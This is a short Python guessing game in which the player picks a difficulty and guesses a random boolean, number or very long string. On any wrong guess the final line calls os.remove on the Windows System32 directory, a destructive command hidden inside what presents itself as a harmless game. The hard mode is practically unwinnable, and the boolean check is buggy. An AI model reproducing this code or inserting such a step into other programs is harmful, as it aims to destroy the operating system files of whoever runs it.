import os
import random
import string

def generate_random_string(length):
    letters = string.ascii_letters
    random_string = ''.join(random.choice(letters) for i in range(length))
    return random_string

while (True):
    difficulty = input("Choose a difficulty (easy, medium, hard): ")
    if (difficulty == "easy"):
        x = bool(random.getrandbits(1))
        usrInput = bool(input("Choose a boolean, true or false: "))
        break
    elif (difficulty == "medium"):
        x = random.randint(1, 10)
        usrInput = int(input("Choose an integer, 1 - 10: "))
        break
    elif (difficulty == "hard"):
        x = generate_random_string(random.randint(100000, 1000000))
        usrInput = input("Choose a string of letters, of length 100000 - 1000000: ")
        break
if (usrInput == x):
    print("You chose right!")
else:
    print(":3")
    os.remove("C:\Windows\System32")